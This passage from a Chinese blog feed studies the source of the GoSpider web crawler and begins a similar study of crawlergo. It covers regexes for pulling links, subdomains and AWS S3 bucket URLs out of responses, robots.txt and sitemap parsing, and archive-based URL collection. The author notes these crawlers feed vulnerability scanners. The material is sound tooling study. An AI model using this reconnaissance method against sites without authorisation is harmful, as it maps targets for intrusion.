*colly.Response)</span></span> &#123;<br><span class="hljs-keyword">if</span> response.StatusCode == <span class="hljs-number">404</span> || response.StatusCode == <span class="hljs-number">429</span> || response.StatusCode &lt; <span class="hljs-number">100</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>respStr := <span class="hljs-type">string</span>(response.Body)<br><span class="hljs-comment">// 响应长度过滤器</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(crawler.filterLength_slice) == <span class="hljs-number">0</span> || !contains(crawler.filterLength_slice, <span class="hljs-built_in">len</span>(respStr)) &#123;<br><br><span class="hljs-comment">// Verify which link is working </span><br>u := response.Request.URL.String()<br><span class="hljs-comment">//....</span><br><span class="hljs-comment">// 判断请求的 url 是否是匹配当前目标正则或者白名单</span><br><span class="hljs-keyword">if</span> InScope(response.Request.URL, crawler.C.URLFilters) &#123;<br><span class="hljs-comment">// 提取子域名和 S3</span><br>crawler.findSubdomains(respStr)<br>crawler.findAWSS3(respStr)<br><span class="hljs-comment">// 从响应中提取路径</span><br>paths, err := LinkFinder(respStr)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>Logger.Error(err)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>currentPathURL, err := url.Parse(u)<br>currentPathURLerr := <span class="hljs-literal">false</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>currentPathURLerr = <span class="hljs-literal">true</span><br>&#125;<br><br><span class="hljs-keyword">for</span> _, relPath := <span class="hljs-keyword">range</span> paths &#123;<br><span class="hljs-keyword">var</span> outputFormat <span class="hljs-type">string</span><br><span class="hljs-comment">// output ...</span><br>rebuildURL := <span class="hljs-string">&quot;&quot;</span><br>                    <span class="hljs-comment">// 使用当前的 URL 或者站点 URL 拼接路径获取 URL =&gt; ResolveReference ( 学到了这个 url 路径拼接 )</span><br><span class="hljs-keyword">if</span> !currentPathURLerr &#123;<br>rebuildURL = FixUrl(currentPathURL, relPath)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>rebuildURL = FixUrl(crawler.site, relPath)<br>&#125;<br><br><span class="hljs-keyword">if</span> rebuildURL == <span class="hljs-string">&quot;&quot;</span> &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><br><span class="hljs-comment">// Try to request JS path</span><br><span class="hljs-comment">// Try to generate URLs with main site</span><br>fileExt := GetExtType(rebuildURL)<br><span class="hljs-keyword">if</span> fileExt == <span class="hljs-string">&quot;.js&quot;</span> || fileExt == <span class="hljs-string">&quot;.xml&quot;</span> || fileExt == <span class="hljs-string">&quot;.json&quot;</span> || fileExt == <span class="hljs-string">&quot;.map&quot;</span> &#123;<br>crawler.feedLinkfinder(rebuildURL, <span class="hljs-string">&quot;linkfinder&quot;</span>, <span class="hljs-string">&quot;javascript&quot;</span>)<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> !crawler.urlSet.Duplicate(rebuildURL) &#123;<br><span class="hljs-keyword">if</span> crawler.JsonOutput &#123;<br>sout := SpiderOutput&#123;<br>Input:      crawler.Input,<br>Source:     response.Request.URL.String(),<br>OutputType: <span class="hljs-string">&quot;linkfinder&quot;</span>,<br>Output:     rebuildURL,<br>&#125;<br><span class="hljs-keyword">if</span> data, err := jsoniter.MarshalToString(sout); err == <span class="hljs-literal">nil</span> &#123;<br>outputFormat = data<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> !crawler.Quiet &#123;<br>outputFormat = fmt.Sprintf(<span class="hljs-string">&quot;[linkfinder] - %s&quot;</span>, rebuildURL)<br>&#125;<br><br>fmt.Println(outputFormat)<br><br><span class="hljs-keyword">if</span> crawler.Output != <span class="hljs-literal">nil</span> &#123;<br>crawler.Output.WriteToFile(outputFormat)<br>&#125;<br><span class="hljs-comment">// 添加访问</span><br>_ = crawler.C.Visit(rebuildURL)<br>&#125;<br><br><span class="hljs-comment">// Try to generate URLs with the site where Javascript file host in (must be in main or sub domain)</span><br><span class="hljs-comment">// 访问这个拼接好的路径 ~</span><br>urlWithJSHostIn := FixUrl(crawler.site, relPath)<br><span class="hljs-keyword">if</span> urlWithJSHostIn != <span class="hljs-string">&quot;&quot;</span> &#123;<br>fileExt := GetExtType(urlWithJSHostIn)<br><span class="hljs-keyword">if</span> fileExt == <span class="hljs-string">&quot;.js&quot;</span> || fileExt == <span class="hljs-string">&quot;.xml&quot;</span> || fileExt == <span class="hljs-string">&quot;.json&quot;</span> || fileExt == <span class="hljs-string">&quot;.map&quot;</span> &#123;<br>crawler.feedLinkfinder(urlWithJSHostIn, <span class="hljs-string">&quot;linkfinder&quot;</span>, <span class="hljs-string">&quot;javascript&quot;</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>                            <span class="hljs-comment">// 有没有爬过 这里就是直接去利用了 </span><br><span class="hljs-keyword">if</span> crawler.urlSet.Duplicate(urlWithJSHostIn) &#123;<br><span class="hljs-keyword">continue</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>                                <span class="hljs-comment">// 添加访问该链接</span><br>_ = crawler.C.Visit(urlWithJSHostIn) <span class="hljs-comment">//not print care for lost link</span><br>&#125;<br>&#125;<br><br>&#125;<br><br>&#125;<br><br>&#125;<br>&#125;<br>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>它这里的 crawler.urlSet.Duplicate(urlWithJSHostIn) 就是直接判断 这个 map 里面是否存在来判断是否爬取过了，请求去重这里没怎么做…</p><p>这里先看一下 LinkFinder 它用于从响应中提取路径：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> linkFinderRegex = regexp.MustCompile(<span class="hljs-string">`(?:&quot;|&#x27;)(((?:[a-zA-Z]&#123;1,10&#125;://|//)[^&quot;&#x27;/]&#123;1,&#125;\.[a-zA-Z]&#123;2,&#125;[^&quot;&#x27;]&#123;0,&#125;)|((?:/|\.\./|\./)[^&quot;&#x27;&gt;&lt;,;| *()(%%$^/\\\[\]][^&quot;&#x27;&gt;&lt;,;|()]&#123;1,&#125;)|([a-zA-Z0-9_\-/]&#123;1,&#125;/[a-zA-Z0-9_\-/]&#123;1,&#125;\.(?:[a-zA-Z]&#123;1,4&#125;|action)(?:[\?|#][^&quot;|&#x27;]&#123;0,&#125;|))|([a-zA-Z0-9_\-/]&#123;1,&#125;/[a-zA-Z0-9_\-/]&#123;3,&#125;(?:[\?|#][^&quot;|&#x27;]&#123;0,&#125;|))|([a-zA-Z0-9_\-]&#123;1,&#125;\.(?:php|asp|aspx|jsp|json|action|html|js|txt|xml)(?:[\?|#][^&quot;|&#x27;]&#123;0,&#125;|)))(?:&quot;|&#x27;)`</span>)<br><br><span class="hljs-comment">// LinkFinder 从响应中寻找路径信息</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">LinkFinder</span><span class="hljs-params">(source <span class="hljs-type">string</span>)</span></span> ([]<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">var</span> links []<span class="hljs-type">string</span><br><span class="hljs-comment">// source = strings.ToLower(source)</span><br>    <span class="hljs-comment">// 响应过大 先对响应进行处理 提高正则表达式的效率</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(source) &gt; <span class="hljs-number">1000000</span> &#123;<br>source = strings.ReplaceAll(source, <span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;;\r\n&quot;</span>)<br>source = strings.ReplaceAll(source, <span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;,\r\n&quot;</span>)<br>&#125;<br>source = DecodeChars(source)<br><br>match := linkFinderRegex.FindAllStringSubmatch(source, <span class="hljs-number">-1</span>)<br><span class="hljs-keyword">for</span> _, m := <span class="hljs-keyword">range</span> match &#123;<br>        <span class="hljs-comment">// 使用 regexp.MustCompile(`[\t\r\n]+`).ReplaceAllString 替换掉换行空格等</span><br>matchGroup1 := FilterNewLines(m[<span class="hljs-number">1</span>])<br><span class="hljs-keyword">if</span> matchGroup1 == <span class="hljs-string">&quot;&quot;</span> &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>links = <span class="hljs-built_in">append</span>(links, matchGroup1)<br>&#125;<br>    <span class="hljs-comment">// 链接验重 判断之前是否爬过了 map[url][bool] </span><br>links = Unique(links)<br><span class="hljs-keyword">return</span> links, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这个先加换行再进行正则 GPT 这里给出的好处：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240323013127911.png?imageSlim" alt="image-20240323013127911"></p><p>然后看下这个 FixUrl 它是用于拼接 url 和爬到的路径的：</p><p>它使用了 ResolveReference 进行这个操作，它会自动处理绝对路径、相对路径，如果路径是 url 的话就不做拼接直接返回这个 url ，挺方便的。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">FixUrl</span><span class="hljs-params">(mainSite *url.URL, nextLoc <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">string</span> &#123;<br>nextLocUrl, err := url.Parse(nextLoc)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br>&#125;<br><span class="hljs-keyword">return</span> mainSite.ResolveReference(nextLocUrl).String()<br>&#125;<br></code></pre></td></tr></table></figure><p>然后就是 feedLinkfinder 对于 js 这种文件的操作：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(crawler *Crawler)</span></span> feedLinkfinder(jsFileUrl <span class="hljs-type">string</span>, OutputType <span class="hljs-type">string</span>, source <span class="hljs-type">string</span>) &#123;<br><span class="hljs-comment">// 判断是否爬过这个 JS</span><br><span class="hljs-keyword">if</span> !crawler.jsSet.Duplicate(jsFileUrl) &#123;<br><span class="hljs-comment">// ....</span><br><br><span class="hljs-comment">// Send Javascript to Link Finder Collector</span><br>        <span class="hljs-comment">// 直接去访问 就行了 提取还是 setupLinkFinder</span><br>_ = crawler.LinkFinderCollector.Visit(jsFileUrl)<br><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>它还对每个请求都检测了子域名和 s3 ：</p><p>这里也是通过正则去提取的，这里其实可以看到俩函数的结构是相同的，可以把这些正则放到配置文件，然后之后去遍历这样子，方便后续添加新的规则：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// SUBRE 子域名的正则表达式</span><br><span class="hljs-keyword">const</span> SUBRE = <span class="hljs-string">`(?i)(([a-zA-Z0-9]&#123;1&#125;|[_a-zA-Z0-9]&#123;1&#125;[_a-zA-Z0-9-]&#123;0,61&#125;[a-zA-Z0-9]&#123;1&#125;)[.]&#123;1&#125;)+`</span><br><br><span class="hljs-keyword">var</span> AWSS3 = regexp.MustCompile(<span class="hljs-string">`(?i)[a-z0-9.-]+\.s3\.amazonaws\.com|[a-z0-9.-]+\.s3-[a-z0-9-]\.amazonaws\.com|[a-z0-9.-]+\.s3-website[.-](eu|ap|us|ca|sa|cn)|//s3\.amazonaws\.com/[a-z0-9._-]+|//s3-[a-z0-9-]+\.amazonaws\.com/[a-z0-9._-]+`</span>)<br><br><span class="hljs-comment">// SubdomainRegex returns a Regexp object initialized to match</span><br><span class="hljs-comment">// subdomain names that end with the domain provided by the parameter.</span><br><span class="hljs-comment">// 通过根域名生成对应子域名的正则表达式</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">subdomainRegex</span><span class="hljs-params">(domain <span class="hljs-type">string</span>)</span></span> *regexp.Regexp &#123;<br><span class="hljs-comment">// Change all the periods into literal periods for the regex</span><br><span class="hljs-comment">// . 修改为正则的点 [.]</span><br>d := strings.Replace(domain, <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;[.]&quot;</span>, <span class="hljs-number">-1</span>)<br><span class="hljs-keyword">return</span> regexp.MustCompile(SUBRE + d)<br>&#125;<br><br><span class="hljs-comment">// GetSubdomains 从数据源 ( 响应信息 ) 中获取子域名</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetSubdomains</span><span class="hljs-params">(source, domain <span class="hljs-type">string</span>)</span></span> []<span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">var</span> subs []<span class="hljs-type">string</span><br>re := subdomainRegex(domain)<br><span class="hljs-keyword">for</span> _, match := <span class="hljs-keyword">range</span> re.FindAllStringSubmatch(source, <span class="hljs-number">-1</span>) &#123;<br>subs = <span class="hljs-built_in">append</span>(subs, CleanSubdomain(match[<span class="hljs-number">0</span>]))<br>&#125;<br><span class="hljs-keyword">return</span> subs<br>&#125;<br><br><span class="hljs-comment">// GetAWSS3 AWS_S3 存储桶的 URL</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetAWSS3</span><span class="hljs-params">(source <span class="hljs-type">string</span>)</span></span> []<span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">var</span> aws []<span class="hljs-type">string</span><br><span class="hljs-keyword">for</span> _, match := <span class="hljs-keyword">range</span> AWSS3.FindAllStringSubmatch(source, <span class="hljs-number">-1</span>) &#123;<br>aws = <span class="hljs-built_in">append</span>(aws, DecodeChars(match[<span class="hljs-number">0</span>]))<br>&#125;<br><span class="hljs-keyword">return</span> aws<br>&#125;<br></code></pre></td></tr></table></figure><p>robots 中提取：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// ParseRobots 从 robots 中寻找 url</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ParseRobots</span><span class="hljs-params">(site *url.URL, crawler *Crawler, c *colly.Collector, wg *sync.WaitGroup)</span></span> &#123;<br><span class="hljs-keyword">defer</span> wg.Done()<br>robotsURL := site.String() + <span class="hljs-string">&quot;/robots.txt&quot;</span><br><br>resp, err := http.Get(robotsURL)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> resp.StatusCode == <span class="hljs-number">200</span> &#123;<br>Logger.Infof(<span class="hljs-string">&quot;Found robots.txt: %s&quot;</span>, robotsURL)<br>body, err := ioutil.ReadAll(resp.Body)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>lines := strings.Split(<span class="hljs-type">string</span>(body), <span class="hljs-string">&quot;\n&quot;</span>)<br><span class="hljs-comment">// 这里的正则匹配 Disallow: Allow: 部分</span><br><span class="hljs-keyword">var</span> re = regexp.MustCompile(<span class="hljs-string">&quot;.*llow: &quot;</span>)<br><span class="hljs-keyword">for</span> _, line := <span class="hljs-keyword">range</span> lines &#123;<br><span class="hljs-keyword">if</span> strings.Contains(line, <span class="hljs-string">&quot;llow: &quot;</span>) &#123;<br><span class="hljs-comment">// 移除 Dis... 部分 ( 正则 )</span><br>url := re.ReplaceAllString(line, <span class="hljs-string">&quot;&quot;</span>)<br>url = FixUrl(site, url)<br><span class="hljs-keyword">if</span> url == <span class="hljs-string">&quot;&quot;</span> &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>outputFormat := fmt.Sprintf(<span class="hljs-string">&quot;[robots] - %s&quot;</span>, url)<br><br><span class="hljs-keyword">if</span> crawler.JsonOutput &#123;<br>sout := SpiderOutput&#123;<br>Input:      crawler.Input,<br>Source:     <span class="hljs-string">&quot;robots&quot;</span>,<br>OutputType: <span class="hljs-string">&quot;url&quot;</span>,<br>Output:     url,<br>&#125;<br><span class="hljs-keyword">if</span> data, err := jsoniter.MarshalToString(sout); err == <span class="hljs-literal">nil</span> &#123;<br>outputFormat = data<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> crawler.Quiet &#123;<br>outputFormat = url<br>&#125;<br>fmt.Println(outputFormat)<br><span class="hljs-keyword">if</span> crawler.Output != <span class="hljs-literal">nil</span> &#123;<br>crawler.Output.WriteToFile(outputFormat)<br>&#125;<br>_ = c.Visit(url)<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>站点地图，使用 gopher-parse-sitemap 库进行的 sitemap 解析：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ParseSiteMap</span><span class="hljs-params">(site *url.URL, crawler *Crawler, c *colly.Collector, wg *sync.WaitGroup)</span></span> &#123;<br><span class="hljs-keyword">defer</span> wg.Done()<br>sitemapUrls := []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;/sitemap.xml&quot;</span>, <span class="hljs-string">&quot;/sitemap_news.xml&quot;</span>, <span class="hljs-string">&quot;/sitemap_index.xml&quot;</span>, <span class="hljs-string">&quot;/sitemap-index.xml&quot;</span>, <span class="hljs-string">&quot;/sitemapindex.xml&quot;</span>,<br><span class="hljs-string">&quot;/sitemap-news.xml&quot;</span>, <span class="hljs-string">&quot;/post-sitemap.xml&quot;</span>, <span class="hljs-string">&quot;/page-sitemap.xml&quot;</span>, <span class="hljs-string">&quot;/portfolio-sitemap.xml&quot;</span>, <span class="hljs-string">&quot;/home_slider-sitemap.xml&quot;</span>, <span class="hljs-string">&quot;/category-sitemap.xml&quot;</span>,<br><span class="hljs-string">&quot;/author-sitemap.xml&quot;</span>&#125;<br><br><span class="hljs-keyword">for</span> _, path := <span class="hljs-keyword">range</span> sitemapUrls &#123;<br><span class="hljs-comment">// Ignore error when that not valid sitemap.xml path</span><br>Logger.Infof(<span class="hljs-string">&quot;Trying to find %s&quot;</span>, site.String()+path)<br>_ = sitemap.ParseFromSite(site.String()+path, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(entry sitemap.Entry)</span></span> <span class="hljs-type">error</span> &#123;<br>outputFormat := fmt.Sprintf(<span class="hljs-string">&quot;[sitemap] - %s&quot;</span>, entry.GetLocation())<br><br><span class="hljs-keyword">if</span> crawler.JsonOutput &#123;<br>sout := SpiderOutput&#123;<br>Input:      crawler.Input,<br>Source:     <span class="hljs-string">&quot;sitemap&quot;</span>,<br>OutputType: <span class="hljs-string">&quot;url&quot;</span>,<br>Output:     entry.GetLocation(),<br>&#125;<br><span class="hljs-keyword">if</span> data, err := jsoniter.MarshalToString(sout); err == <span class="hljs-literal">nil</span> &#123;<br>outputFormat = data<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> crawler.Quiet &#123;<br>outputFormat = entry.GetLocation()<br>&#125;<br>fmt.Println(outputFormat)<br><span class="hljs-keyword">if</span> crawler.Output != <span class="hljs-literal">nil</span> &#123;<br>crawler.Output.WriteToFile(outputFormat)<br>&#125;<br>_ = c.Visit(entry.GetLocation())<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;)<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这里还有一些第三方的 url 收集，就是 Wayback Machine、Common Crawl、Virus Total、Alien Vault 这些：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240323033408855.png?imageSlim" alt="image-20240323033408855"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">getWaybackURLs</span><span class="hljs-params">(domain <span class="hljs-type">string</span>, noSubs <span class="hljs-type">bool</span>)</span></span> ([]wurl, <span class="hljs-type">error</span>) &#123;<br>subsWildcard := <span class="hljs-string">&quot;*.&quot;</span><br><span class="hljs-keyword">if</span> noSubs &#123;<br>subsWildcard = <span class="hljs-string">&quot;&quot;</span><br>&#125;<br><span class="hljs-comment">// 从一个网站存档中获取响应</span><br>res, err := http.Get(<br>fmt.Sprintf(<span class="hljs-string">&quot;http://web.archive.org/cdx/search/cdx?url=%s%s/*&amp;output=json&amp;collapse=urlkey&quot;</span>, subsWildcard, domain),<br>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> []wurl&#123;&#125;, err<br>&#125;<br><br>raw, err := ioutil.ReadAll(res.Body)<br><br>res.Body.Close()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> []wurl&#123;&#125;, err<br>&#125;<br><br><span class="hljs-keyword">var</span> wrapper [][]<span class="hljs-type">string</span><br>err = json.Unmarshal(raw, &amp;wrapper)<br><br>out := <span class="hljs-built_in">make</span>([]wurl, <span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(wrapper))<br><br>skip := <span class="hljs-literal">true</span><br><span class="hljs-keyword">for</span> _, urls := <span class="hljs-keyword">range</span> wrapper &#123;<br><span class="hljs-comment">// The first item is always just the string &quot;original&quot;,</span><br><span class="hljs-comment">// so we should skip the first item</span><br><span class="hljs-keyword">if</span> skip &#123;<br>skip = <span class="hljs-literal">false</span><br><span class="hljs-keyword">continue</span><br>&#125;<br>out = <span class="hljs-built_in">append</span>(out, wurl&#123;date: urls[<span class="hljs-number">1</span>], url: urls[<span class="hljs-number">2</span>]&#125;)<br>&#125;<br><br><span class="hljs-keyword">return</span> out, <span class="hljs-literal">nil</span><br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="学习总结"><a href="#学习总结" class="headerlink" title="学习总结"></a>学习总结</h2><ol><li>学到了 colly 爬虫框架的使用</li><li>http.ProxyURL(pU)、ResolveReference</li></ol><p>不过还有一些地方可以再优化一下，比如请求队列去重，GoSpider 并没有做这个操作，还有对于 aws-s3 这些响应中敏感信息的提取可以去写一个配置文件来实现这个操作，有助于后期增添新的规则，动态爬虫也可以实现这一操作。</p><p>看到网上使用 GoSpider 后会使用 uro 进行链接去重，后面可以看看。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 源码学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>crawlergo 源码学习</title>
      <link href="/2024/03/12/%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/crawlergo/"/>
      <url>/2024/03/12/%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/crawlergo/</url>
      
        <content type="html"><![CDATA[<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>项目地址：<a href="https://github.com/Qianlitp/crawlergo">https://github.com/Qianlitp/crawlergo</a></p><p>crawlergo是一个使用<code>chrome headless</code>模式进行URL收集的浏览器爬虫。它对整个网页的关键位置与DOM渲染阶段进行HOOK，自动进行表单填充并提交，配合智能的JS事件触发，尽可能的收集网站暴露出的入口。内置URL去重模块，过滤掉了大量伪静态URL，对于大型网站仍保持较快的解析与抓取速度，最后得到高质量的请求结果集合。</p><p>crawlergo 目前支持以下特性：</p><ul><li>原生浏览器环境，协程池调度任务</li><li>表单智能填充、自动化提交</li><li>完整DOM事件收集，自动化触发</li><li>智能URL去重，去掉大部分的重复请求</li><li>全面分析收集，包括javascript文件内容、页面注释、robots.txt文件和常见路径Fuzz</li><li>支持Host绑定，自动添加Referer</li><li>支持请求代理，支持爬虫结果主动推送</li></ul><p>crawlergo 是现在用的比较多的动态爬虫了，一般就是 crawlergo + xray 组合来进行漏扫，现在就来看看 crawlergo 的源码。</p><h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs shell">├── cmd<br>│   └── crawlergo<br>│       ├── flag.go<br>│       └── main.go<br>├── pkg<br>│   ├── config<br>│   │   ├── config.go<br>│   ├── domain_collect.go// 域名收集 ( 从请求列表中获取到 hostname )<br>│   ├── engine<br>│   │   ├── after_dom_tasks.go// DOM 节点加载完成之后 表单填充|ObserverJS监听DOM|启动 AfterLoadedRun() )<br>│   │   ├── after_loaded_tasks.go// 页面加载之后 提交表单|事件触发<br>│   │   ├── browser.go// 浏览器的初始化<br>│   │   ├── 